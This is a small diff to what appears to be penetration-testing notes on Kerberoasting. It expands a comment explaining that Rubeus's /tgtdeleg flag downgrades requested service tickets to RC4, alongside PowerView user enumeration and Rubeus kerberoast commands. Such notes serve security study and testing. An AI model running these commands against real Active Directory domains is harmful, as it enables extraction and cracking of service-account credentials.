@@ -161,7 +161,7 @@ Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supp
 # get ticket (we can see the supported Encryption type also)
 .\Rubeus.exe kerberoast /user:testspn /nowrap
 
-# downgrade to RC4
+# downgrade to RC4 ( /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket )
 .\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
 ```
 | Hash Prefix       | Encryption Type | Etype Number | Hashcat ID |
